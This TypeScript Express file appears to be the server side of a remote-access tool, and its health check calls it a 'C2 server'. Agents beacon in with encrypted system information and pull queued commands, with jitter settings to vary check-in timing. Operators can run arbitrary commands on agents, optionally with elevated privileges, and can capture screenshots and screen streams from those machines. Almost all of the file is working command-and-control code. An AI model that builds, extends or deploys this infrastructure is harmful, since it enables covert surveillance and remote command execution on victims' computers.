import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { CryptoUtils } from "./crypto";
import { WebSocketServer, WebSocket } from "ws";
import { z } from "zod";
import { ZodError } from "zod";

// Connected clients map
const connectedClients = new Map<string, {
  ws: WebSocket;
  agentId: number;
}>();

// Helper functions
function sendResponse(res: Response, status: number, message: string | object) {
  return res.status(status).json(
    typeof message === 'string' ? { message } : message
  );
}

function handleError(res: Response, error: unknown) {
  console.error('Error:', error);
  
  if (error instanceof ZodError) {
    return sendResponse(res, 400, {
      message: 'Validation error',
      errors: error.errors
    });
  }
  
  return sendResponse(res, 500, 'Internal server error');
}

export async function registerRoutes(app: Express): Promise<Server> {
  const httpServer = createServer(app);
  
  // Initialize WebSocket server with explicit path and improved options
  const wss = new WebSocketServer({ 
    server: httpServer, 
    path: '/ws',
    clientTracking: true, // Track clients explicitly
    perMessageDeflate: {
      zlibDeflateOptions: {
        level: 6, // Compression level (0-9)
      }
    }
  });
  
  console.log('WebSocket server initialized at path: /ws');
  
  // Set up heartbeat interval to detect disconnected clients
  const heartbeatInterval = setInterval(() => {
    wss.clients.forEach((ws: WebSocket) => {
      // Terminate if connection is no longer alive
      if ((ws as any).isAlive === false) {
        return ws.terminate();
      }
      
      // Mark as not alive, will be marked alive when pong is received
      (ws as any).isAlive = false;
      ws.ping();
    });
  }, 30000); // Check every 30 seconds
  
  // Clean up interval on server close
  httpServer.on('close', () => {
    clearInterval(heartbeatInterval);
  });
  
  // WebSocket connection handling
  wss.on('connection', (ws: WebSocket) => {
    console.log('New WebSocket connection established');
    
    // Set isAlive property for heartbeat
    (ws as any).isAlive = true;
    
    // Handle pong response
    ws.on('pong', () => {
      (ws as any).isAlive = true;
    });
    
    let clientId: string | null = null;
    
    // Handle ping message type from client
    ws.on('message', async (message: any) => {
      // Convert Buffer or other formats to string if needed
      const messageStr = message.toString ? message.toString() : message;
      
      // Keep connection alive if client sends a ping
      if (messageStr === 'ping') {
        ws.send('pong');
        return;
      }
      try {
        const data = JSON.parse(messageStr);
        
        // Handle client authentication
        if (data.type === 'auth' && data.clientId) {
          clientId = data.clientId as string;
          const agent = await storage.getAgentByClientId(clientId);
          
          if (agent) {
            // Store the connection in the connectedClients map
            connectedClients.set(clientId, { ws, agentId: agent.id });
            
            // Update agent status
            await storage.updateAgent(clientId, { isOnline: true, lastSeen: new Date() });
            
            // Log activity
            await storage.createActivity({
              agentId: agent.id,
              clientId,
              activityType: 'connect',
              details: { message: 'Agent connected via WebSocket' }
            });
            
            // Send acknowledgement
            ws.send(JSON.stringify({ type: 'auth_success' }));
          } else {
            ws.send(JSON.stringify({ type: 'auth_failed', message: 'Unknown client ID' }));
            ws.close();
          }
        }
        
        // Handle frame data for screen streaming
        else if (data.type === 'frame' && clientId) {
          // Forward frame to anyone viewing the stream
          // This would be handled by forwarding to admin UI
        }
      } catch (error) {
        console.error('WebSocket message error:', error);
      }
    });
    
    ws.on('close', async () => {
      if (clientId) {
        const client = connectedClients.get(clientId);
        if (client) {
          // Update agent status
          await storage.updateAgent(clientId, { isOnline: false, lastSeen: new Date() });
          
          // Log activity
          await storage.createActivity({
            agentId: client.agentId,
            clientId,
            activityType: 'disconnect',
            details: { message: 'Agent disconnected from WebSocket' }
          });
          
          // Remove from connected clients
          connectedClients.delete(clientId);
        }
      }
    });
    
    ws.on('error', (error) => {
      console.error('WebSocket error:', error);
    });
  });
  
  // API Endpoints
  
  // Basic health check endpoint
  app.get('/api/health', (req, res) => {
    sendResponse(res, 200, 'C2 server operational');
  });
  
  // Register/beacon endpoint for agents to check in
  app.post('/api/beacon', async (req, res) => {
    try {
      // Check if the data is encrypted
      const { clientId, systemInfo, encryptedData } = req.body;
      
      let decryptedSystemInfo;
      
      // If encrypted, decrypt the system info
      if (encryptedData) {
        try {
          decryptedSystemInfo = JSON.parse(CryptoUtils.decrypt(encryptedData));
        } catch (error) {
          return sendResponse(res, 400, 'Invalid encryption data');
        }
      } else if (systemInfo) {
        decryptedSystemInfo = systemInfo;
      } else {
        return sendResponse(res, 400, 'Missing required data');
      }
      
      let agent;
      
      // If client ID is provided, update the existing agent
      if (clientId) {
        agent = await storage.getAgentByClientId(clientId);
        
        if (agent) {
          // Update agent with new system info
          agent = await storage.updateAgent(clientId, {
            ...decryptedSystemInfo,
            isOnline: true,
            lastSeen: new Date()
          });
          
          // Log check-in activity
          await storage.createActivity({
            agentId: agent!.id,
            clientId,
            activityType: 'check-in',
            details: { message: 'Agent checked in' }
          });
        }
      }
      
      // If no agent found, create a new one
      if (!agent) {
        const newClientId = clientId || CryptoUtils.generateClientId();
        
        agent = await storage.createAgent({
          clientId: newClientId,
          ...decryptedSystemInfo,
          isOnline: true
        });
        
        // Log new agent activity
        await storage.createActivity({
          agentId: agent.id,
          clientId: newClientId,
          activityType: 'new-agent',
          details: { message: 'New agent registered' }
        });
      }
      
      // Generate commands for the agent to execute
      const pendingCommands = await storage.getCommandsByAgentId(agent.id);
      const commandsToExecute = pendingCommands.filter(cmd => cmd.status === 'pending');
      
      // Get server settings
      const beaconInterval = agent.beaconInterval;
      const jitter = agent.jitter;
      
      // Prepare response
      const response = {
        clientId: agent.clientId,
        commands: commandsToExecute,
        settings: {
          beaconInterval,
          jitter
        }
      };
      
      // Encrypt the response if the request was encrypted
      const serverResponse = encryptedData
        ? { encryptedResponse: CryptoUtils.encrypt(JSON.stringify(response)) }
        : response;
      
      return sendResponse(res, 200, serverResponse);
      
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Screenshot endpoint
  app.post('/api/screenshot', async (req, res) => {
    try {
      const { clientId, screenshot, encryptedData } = req.body;
      
      if (!clientId) {
        return sendResponse(res, 400, 'Client ID is required');
      }
      
      const agent = await storage.getAgentByClientId(clientId);
      
      if (!agent) {
        return sendResponse(res, 404, 'Agent not found');
      }
      
      let screenshotData;
      
      // If encrypted, decrypt the screenshot data
      if (encryptedData) {
        try {
          screenshotData = CryptoUtils.decrypt(encryptedData);
        } catch (error) {
          return sendResponse(res, 400, 'Invalid encryption data');
        }
      } else {
        screenshotData = screenshot;
      }
      
      if (!screenshotData) {
        return sendResponse(res, 400, 'Screenshot data is required');
      }
      
      // Save the screenshot
      const newScreenshot = await storage.createScreenshot({
        agentId: agent.id,
        imageData: screenshotData,
        width: req.body.width,
        height: req.body.height
      });
      
      // Log activity
      await storage.createActivity({
        agentId: agent.id,
        clientId,
        activityType: 'screenshot',
        details: { screenshotId: newScreenshot.id }
      });
      
      return sendResponse(res, 200, { message: 'Screenshot received', id: newScreenshot.id });
      
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Command result endpoint
  app.post('/api/command/result', async (req, res) => {
    try {
      const { clientId, commandId, output, status, executionTime, encryptedData } = req.body;
      
      if (!clientId || !commandId) {
        return sendResponse(res, 400, 'Client ID and Command ID are required');
      }
      
      const agent = await storage.getAgentByClientId(clientId);
      
      if (!agent) {
        return sendResponse(res, 404, 'Agent not found');
      }
      
      let commandOutput;
      let commandStatus;
      
      // If encrypted, decrypt the command output
      if (encryptedData) {
        try {
          const decrypted = JSON.parse(CryptoUtils.decrypt(encryptedData));
          commandOutput = decrypted.output;
          commandStatus = decrypted.status;
        } catch (error) {
          return sendResponse(res, 400, 'Invalid encryption data');
        }
      } else {
        commandOutput = output;
        commandStatus = status;
      }
      
      // Update the command with the result
      const command = await storage.updateCommand(parseInt(commandId), {
        output: commandOutput,
        status: commandStatus || 'completed',
        executionTime: executionTime
      });
      
      if (!command) {
        return sendResponse(res, 404, 'Command not found');
      }
      
      // Log activity
      await storage.createActivity({
        agentId: agent.id,
        clientId,
        activityType: 'command-result',
        details: { commandId, status: commandStatus }
      });
      
      return sendResponse(res, 200, { message: 'Command result received' });
      
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Stream frame endpoint
  app.post('/api/frame/:clientId', async (req, res) => {
    try {
      const { clientId } = req.params;
      const { frame } = req.body;
      
      if (!clientId || !frame) {
        return sendResponse(res, 400, 'Client ID and frame data are required');
      }
      
      const agent = await storage.getAgentByClientId(clientId);
      
      if (!agent) {
        return sendResponse(res, 404, 'Agent not found');
      }
      
      // This would typically forward the frame to any connected admin viewers
      // Through WebSockets or other real-time mechanism
      
      return sendResponse(res, 200, { message: 'Frame received' });
      
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Admin API endpoints
  
  // Get all agents
  app.get('/api/agents', async (req, res) => {
    try {
      const agents = await storage.getAgents();
      return sendResponse(res, 200, agents);
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Get a specific agent
  app.get('/api/agents/:id', async (req, res) => {
    try {
      const agent = await storage.getAgent(parseInt(req.params.id));
      
      if (!agent) {
        return sendResponse(res, 404, 'Agent not found');
      }
      
      return sendResponse(res, 200, agent);
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Delete an agent
  app.delete('/api/agents/:id', async (req, res) => {
    try {
      const deleted = await storage.deleteAgent(parseInt(req.params.id));
      
      if (!deleted) {
        return sendResponse(res, 404, 'Agent not found');
      }
      
      return sendResponse(res, 200, { message: 'Agent deleted' });
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Take a screenshot of an agent
  app.post('/api/agents/:id/screenshot', async (req, res) => {
    try {
      const agent = await storage.getAgent(parseInt(req.params.id));
      
      if (!agent) {
        return sendResponse(res, 404, 'Agent not found');
      }
      
      if (!agent.isOnline) {
        return sendResponse(res, 400, 'Agent is offline');
      }
      
      // Create a command to take a screenshot
      const screenshotCommand = await storage.createCommand({
        agentId: agent.id,
        command: "screenshot",
        elevatedPrivileges: false,
        waitForOutput: true
      });
      
      // Send the command to the agent if connected via WebSocket
      const client = connectedClients.get(agent.clientId);
      
      if (client) {
        client.ws.send(JSON.stringify({
          type: 'command',
          command: 'screenshot',
          commandId: screenshotCommand.id
        }));
        
        return sendResponse(res, 202, { 
          message: 'Screenshot command sent', 
          commandId: screenshotCommand.id 
        });
      } else {
        // Agent will get the command on next check-in
        return sendResponse(res, 202, { 
          message: 'Screenshot command queued', 
          commandId: screenshotCommand.id 
        });
      }
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Execute a command on an agent
  app.post('/api/agents/:id/command', async (req, res) => {
    try {
      const commandSchema = z.object({
        command: z.string().min(1),
        elevatedPrivileges: z.boolean().default(false),
        waitForOutput: z.boolean().default(true)
      });
      
      const validatedData = commandSchema.parse(req.body);
      
      const agent = await storage.getAgent(parseInt(req.params.id));
      
      if (!agent) {
        return sendResponse(res, 404, 'Agent not found');
      }
      
      if (!agent.isOnline) {
        return sendResponse(res, 400, 'Agent is offline');
      }
      
      // Create the command
      const command = await storage.createCommand({
        agentId: agent.id,
        command: validatedData.command,
        elevatedPrivileges: validatedData.elevatedPrivileges,
        waitForOutput: validatedData.waitForOutput
      });
      
      // Send the command to the agent if connected via WebSocket
      const client = connectedClients.get(agent.clientId);
      
      if (client) {
        client.ws.send(JSON.stringify({
          type: 'command',
          command: validatedData.command,
          commandId: command.id,
          elevatedPrivileges: validatedData.elevatedPrivileges,
          waitForOutput: validatedData.waitForOutput
        }));
        
        return sendResponse(res, 202, { 
          message: 'Command sent', 
          commandId: command.id 
        });
      } else {
        // Agent will get the command on next check-in
        return sendResponse(res, 202, { 
          message: 'Command queued', 
          commandId: command.id 
        });
      }
    } catch (error) {
      if (error instanceof ZodError) {
        return sendResponse(res, 400, {
          message: 'Invalid command data',
          errors: error.errors
        });
      }
      return handleError(res, error);
    }
  });
  
  // Get all screenshots
  app.get('/api/screenshots', async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : undefined;
      const screenshots = await storage.getScreenshots(limit);
      
      // Map to include agent info with each screenshot
      const results = await Promise.all(screenshots.map(async (screenshot) => {
        const agent = await storage.getAgent(screenshot.agentId);
        return {
          ...screenshot,
          agent: agent ? {
            id: agent.id,
            hostname: agent.hostname,
            ip: agent.ip,
            platform: agent.platform
          } : null
        };
      }));
      
      return sendResponse(res, 200, results);
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Get a specific screenshot
  app.get('/api/screenshots/:id', async (req, res) => {
    try {
      const screenshot = await storage.getScreenshot(parseInt(req.params.id));
      
      if (!screenshot) {
        return sendResponse(res, 404, 'Screenshot not found');
      }
      
      const agent = await storage.getAgent(screenshot.agentId);
      
      return sendResponse(res, 200, {
        ...screenshot,
        agent: agent ? {
          id: agent.id,
          hostname: agent.hostname,
          ip: agent.ip,
          platform: agent.platform
        } : null
      });
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Delete a screenshot
  app.delete('/api/screenshots/:id', async (req, res) => {
    try {
      const deleted = await storage.deleteScreenshot(parseInt(req.params.id));
      
      if (!deleted) {
        return sendResponse(res, 404, 'Screenshot not found');
      }
      
      return sendResponse(res, 200, { message: 'Screenshot deleted' });
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Get all commands
  app.get('/api/commands', async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : undefined;
      const commands = await storage.getCommands(limit);
      
      // Map to include agent info with each command
      const results = await Promise.all(commands.map(async (command) => {
        const agent = await storage.getAgent(command.agentId);
        return {
          ...command,
          agent: agent ? {
            id: agent.id,
            hostname: agent.hostname,
            ip: agent.ip
          } : null
        };
      }));
      
      return sendResponse(res, 200, results);
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Get a specific command
  app.get('/api/commands/:id', async (req, res) => {
    try {
      const command = await storage.getCommand(parseInt(req.params.id));
      
      if (!command) {
        return sendResponse(res, 404, 'Command not found');
      }
      
      const agent = await storage.getAgent(command.agentId);
      
      return sendResponse(res, 200, {
        ...command,
        agent: agent ? {
          id: agent.id,
          hostname: agent.hostname,
          ip: agent.ip
        } : null
      });
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Get recent activities
  app.get('/api/activities', async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 20;
      const activities = await storage.getActivities(limit);
      
      // Map to include agent info with each activity
      const results = await Promise.all(activities.map(async (activity) => {
        let agent = null;
        
        if (activity.agentId) {
          agent = await storage.getAgent(activity.agentId);
          if (agent) {
            agent = {
              id: agent.id,
              hostname: agent.hostname,
              ip: agent.ip
            };
          }
        }
        
        return {
          ...activity,
          agent
        };
      }));
      
      return sendResponse(res, 200, results);
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Get server stats
  app.get('/api/stats', async (req, res) => {
    try {
      const totalAgents = await storage.countAgents();
      const onlineAgents = await storage.countAgents({ isOnline: true });
      const offlineAgents = totalAgents - onlineAgents;
      
      const commands = await storage.getCommands();
      const commandsRun = commands.length;
      
      const screenshots = await storage.getScreenshots();
      const screenshotsCount = screenshots.length;
      
      return sendResponse(res, 200, {
        totalAgents,
        onlineAgents,
        offlineAgents,
        commandsRun,
        screenshotsCount
      });
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Get server settings
  app.get('/api/settings', async (req, res) => {
    try {
      const settings = await storage.getSettings();
      return sendResponse(res, 200, settings);
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  // Update server settings
  app.put('/api/settings/:key', async (req, res) => {
    try {
      const { key } = req.params;
      const { value } = req.body;
      
      if (!value) {
        return sendResponse(res, 400, 'Setting value is required');
      }
      
      let setting = await storage.getSetting(key);
      
      if (setting) {
        setting = await storage.updateSetting(key, value);
      } else {
        setting = await storage.createSetting({
          key,
          value,
          description: req.body.description
        });
      }
      
      return sendResponse(res, 200, setting);
    } catch (error) {
      return handleError(res, error);
    }
  });
  
  return httpServer;
}
